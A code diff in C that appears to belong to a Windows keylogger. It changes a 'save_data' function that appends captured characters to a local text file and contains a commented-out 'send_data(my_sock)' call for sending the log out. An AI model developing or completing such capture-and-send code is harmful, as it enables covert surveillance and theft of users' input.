@@ -161,41 +161,39 @@ void	setwinhook()
 void	save_data(const char *data)
 {
 	static int nbChar;
-
-	/* test time
-
 	static time_t timet1;
 	static double countTime;
 
-	time_t timet2;
+	time_t timet2 = 0;
+
 	Sleep(3000);
 	time(&timet2); 
 
-	double elapseTime;
+	double elapseTime = 0;
 
+	if (timet1 != 0)
 	elapseTime = difftime(timet2, timet1);
-
-	printf( "Time : %f\n", countTime);
-	*/
 
 	FILE *file;
 	if (_wfopen_s(&file, L"test.txt", L"a+") != 0)
 		_wperror(L" Open file failed ");
 	_write(_fileno(file), data, (unsigned int)strlen(data));
-	if (nbChar == 70)
+	if (nbChar == 61)
 	{
 		if (vfprintf_s(file, "\n", NULL) < 0)
 			_wperror(L" Add \\n at the end of the file failed ");
 	//	send_data(my_sock);
 		nbChar = 0;
+		countTime = 0;
 	}
 
 	if (fclose(file) != 0)
 		_wperror(L" Close file failed ");
 
-	/* countTime = countTime + elapseTime; 
-	if (countTime > 60)
-		timet1 = 0; */
+	//printf("ElapseTime : %f\n", elapseTime);
+	//printf("CountTime : %f\n", countTime);
+
+	timet1 = timet2;
 
 	nbChar++;
 
